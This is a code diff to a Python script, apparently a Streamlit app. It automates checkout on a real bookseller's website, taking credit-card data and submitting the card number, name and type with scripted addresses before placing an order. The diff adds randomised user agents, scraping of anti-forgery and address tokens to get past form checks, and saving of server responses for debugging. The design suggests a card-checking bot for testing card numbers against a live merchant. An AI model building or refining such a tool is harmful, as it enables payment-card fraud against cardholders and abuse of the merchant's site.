@@ -4,6 +4,7 @@ import re
 import time
 import random
 import string
+from fake_useragent import UserAgent
 import json
 
 # Set page configuration
@@ -235,15 +236,39 @@ def process_donation_with_debug(cc_data, debug_log):
             
         time.sleep(2)
         
-        # Step 4: Proceed to checkout
-        log("STEP 4: Proceeding to checkout and setting email", "STEP")
+        # Step 4: Get cart page to extract address tokens
+        log("STEP 4a: Visiting cart page to extract tokens", "STEP")
         
-        # First check if we need to visit the cart page first
+        # Visit cart page to get the address tokens
         cart_page = session.get('https://www.ywampublishing.com/shoppingcart.aspx', 
                               headers={'user-agent': user_agent})
         log(f"Cart page status code: {cart_page.status_code}")
         
+        # Save the cart page for analysis
+        with open("cart_page.html", "w", encoding="utf-8") as f:
+            f.write(cart_page.text)
+        log("Saved cart page for analysis")
+        
+        # Extract address tokens from the cart page
+        token_billing_match = re.search(r'class="btn btn-default add-address-button" href="/address/detail\?makePrimary=True&amp;addressType=Billing&amp;returnurl=%2Fshoppingcart.aspx&amp;token=([^"]+)"', cart_page.text)
+        token_shipping_match = re.search(r'class="btn btn-default add-address-button" href="/address/detail\?makePrimary=True&amp;addressType=Shipping&amp;returnurl=%2Fshoppingcart.aspx&amp;token=([^"]+)"', cart_page.text)
+        
+        token_billing = token_billing_match.group(1) if token_billing_match else ''
+        token_shipping = token_shipping_match.group(1) if token_shipping_match else ''
+        
+        if token_billing:
+            log(f"Successfully extracted billing address token: {token_billing[:10]}...", "SUCCESS")
+        else:
+            log("Failed to extract billing address token - will attempt without it", "WARN")
+            
+        if token_shipping:
+            log(f"Successfully extracted shipping address token: {token_shipping[:10]}...", "SUCCESS")
+        else:
+            log("Failed to extract shipping address token - will attempt without it", "WARN")
+        
         # Now proceed to checkout and set email
+        log("STEP 4b: Setting email for checkout", "STEP")
+        
         headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'content-type': 'application/x-www-form-urlencoded',
@@ -274,12 +299,12 @@ def process_donation_with_debug(cc_data, debug_log):
             return "Error: Could not extract verification token", logs
             
         tokenpayment = token_match.group(1)
-        log(f"Extracted token: {tokenpayment[:10]}...")
+        log(f"Extracted verification token: {tokenpayment[:10]}...")
         
         time.sleep(2)
         
-        # Step 5: Set shipping address (missing in original code)
-        log("STEP 5a: Setting shipping address", "STEP")
+        # Step 5: Set shipping address with token
+        log("STEP 5a: Setting shipping address with token", "STEP")
         
         headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -287,13 +312,19 @@ def process_donation_with_debug(cc_data, debug_log):
             'user-agent': user_agent,
         }
         
+        # Include token if available
         params = {
             'makePrimary': 'True',
-            'addressType': 'Shipping',  # This is different from original
+            'addressType': 'Shipping',
             'returnurl': '/shoppingcart.aspx',
         }
         
+        if token_shipping:
+            params['token'] = token_shipping
+            log(f"Using shipping address token: {token_shipping[:10]}...")
+        
         data = {
+            '__RequestVerificationToken': tokenpayment,
             'Address.Id': '',
             'MakePrimary': 'True',
             'Address.Country': 'United States',
@@ -324,19 +355,32 @@ def process_donation_with_debug(cc_data, debug_log):
             log("Validation errors found on shipping address:", "WARN")
             for error in validation_errors:
                 log(f"  - {error.strip()}", "WARN")
+        else:
+            log("No validation errors on shipping address form", "SUCCESS")
+        
+        # Save shipping address response
+        with open("shipping_address_response.html", "w", encoding="utf-8") as f:
+            f.write(req4a.text)
+        log("Saved shipping address response for analysis")
         
         time.sleep(2)
         
-        # Step 5b: Set billing address
-        log("STEP 5b: Setting billing address", "STEP")
+        # Step 5b: Set billing address with token
+        log("STEP 5b: Setting billing address with token", "STEP")
         
+        # Include token if available
         params = {
             'makePrimary': 'True',
             'addressType': 'Billing',
             'returnurl': '/shoppingcart.aspx',
         }
         
+        if token_billing:
+            params['token'] = token_billing
+            log(f"Using billing address token: {token_billing[:10]}...")
+        
         data = {
+            '__RequestVerificationToken': tokenpayment,
             'Address.Id': '',
             'MakePrimary': 'True',
             'Address.Country': 'United States',
@@ -366,6 +410,13 @@ def process_donation_with_debug(cc_data, debug_log):
             log("Validation errors found on billing address:", "WARN")
             for error in validation_errors:
                 log(f"  - {error.strip()}", "WARN")
+        else:
+            log("No validation errors on billing address form", "SUCCESS")
+            
+        # Save billing address response
+        with open("billing_address_response.html", "w", encoding="utf-8") as f:
+            f.write(req4b.text)
+        log("Saved billing address response for analysis")
         
         time.sleep(2)
         
@@ -379,6 +430,7 @@ def process_donation_with_debug(cc_data, debug_log):
         }
         
         data = {
+            '__RequestVerificationToken': tokenpayment,
             'Name': name1,
             'Number': cc,
             'CardType': card_type,
@@ -408,6 +460,8 @@ def process_donation_with_debug(cc_data, debug_log):
             log("Validation errors found on credit card form:", "WARN")
             for error in validation_errors:
                 log(f"  - {error.strip()}", "WARN")
+        else:
+            log("No validation errors on credit card form", "SUCCESS")
         
         # Save this response to analyze
         with open("card_submission_response.html", "w", encoding="utf-8") as f:
@@ -425,6 +479,11 @@ def process_donation_with_debug(cc_data, debug_log):
         
         log(f"Shipping method page status code: {shipping_page.status_code}")
         
+        # Save shipping method page
+        with open("shipping_method_page.html", "w", encoding="utf-8") as f:
+            f.write(shipping_page.text)
+        log("Saved shipping method page for analysis")
+        
         # If shipping method is required, select one
         if 'ShippingMethodId' in shipping_page.text:
             log("Shipping method selection required", "INFO")
@@ -441,6 +500,7 @@ def process_donation_with_debug(cc_data, debug_log):
                 
                 # Submit the shipping method
                 shipping_data = {
+                    '__RequestVerificationToken': tokenpayment,
                     'ShippingMethodId': shipping_id,
                 }
                 
@@ -451,13 +511,30 @@ def process_donation_with_debug(cc_data, debug_log):
                 )
                 
                 log(f"Shipping method selection status code: {shipping_response.status_code}")
+                
+                # Save shipping method response
+                with open("shipping_method_response.html", "w", encoding="utf-8") as f:
+                    f.write(shipping_response.text)
+                log("Saved shipping method response for analysis")
             else:
                 log("No shipping methods found, but they might be required", "WARN")
         else:
             log("No shipping method selection required")
         
-        # Step 7: Place order
-        log("STEP 7b: Placing final order", "STEP")
+        # Step 8: Go to checkout page
+        log("STEP 7b: Going to checkout page", "STEP")
+        checkout_page = session.get('https://www.ywampublishing.com/checkout/index', 
+                                 headers={'user-agent': user_agent})
+        
+        log(f"Checkout page status code: {checkout_page.status_code}")
+        
+        # Save checkout page
+        with open("checkout_page.html", "w", encoding="utf-8") as f:
+            f.write(checkout_page.text)
+        log("Saved checkout page for analysis")
+        
+        # Step 9: Place order
+        log("STEP 7c: Placing final order", "STEP")
         
         headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
